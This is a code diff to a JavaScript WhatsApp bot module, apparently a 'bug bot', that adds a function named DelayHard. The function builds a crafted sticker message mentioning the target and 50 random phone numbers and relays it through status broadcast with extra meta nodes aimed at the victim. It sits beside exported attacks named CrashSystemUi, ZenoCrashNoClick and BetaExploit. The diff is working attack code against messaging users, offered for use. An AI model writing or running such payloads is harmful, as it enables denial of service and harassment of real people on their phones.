@@ -3739,6 +3739,62 @@ async function ZenoCrashNoClick(target) {
     participant: { jid: target },
   });
 }
+//Delay
+async function DelayHard(sock, target) {
+    const stickerMsg = {
+  message: {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
+      mimetype: "image/webp",
+      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+      fileLength: 1173741,
+      mediaKeyTimestamp: Date.now(),
+      isAnimated: false,
+      directPath: "/v/t62.7118-24/sample_sticker.enc",
+      contextInfo: {
+        mentionedJid: [
+          target,
+          ...Array.from({ length: 50 }, () =>
+            "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+          ),
+        ],
+        participant: target,
+        remoteJid: "status@broadcast",
+      },
+    },
+  },
+};
+
+const msg = generateWAMessageFromContent(target, stickerMsg.message, {});
+
+await sock.relayMessage("status@broadcast", msg.message, {
+  messageId: msg.key.id,
+  statusJidList: [target],
+  additionalNodes: [
+    {
+      tag: "meta",
+      attrs: {},
+      content: [
+        {
+          tag: "mentioned_users",
+          attrs: {},
+          content: [
+            {
+              tag: "to",
+              attrs: { jid: target },
+              content: []
+            },
+          ],
+        },
+      ],
+    },
+  ],
+});
+
+console.log("✅ Sticker berhasil dikirim tanpa error.");
+}
 module.exports = {
   // Session management
   activeConnections,
@@ -3819,4 +3875,5 @@ BetaExploit,
   CrashSystemUi,
   yhcv,
   ZenoCrashNoClick,
+  DelayHard,
 };
